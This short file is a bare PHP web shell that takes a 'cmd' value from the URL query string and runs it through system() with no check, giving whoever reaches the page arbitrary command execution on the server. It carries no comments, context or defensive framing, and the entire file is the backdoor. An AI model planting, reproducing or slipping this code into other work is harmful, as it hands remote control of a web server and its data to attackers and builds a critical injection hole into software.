<?php
if(isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    system($command);
}
?>
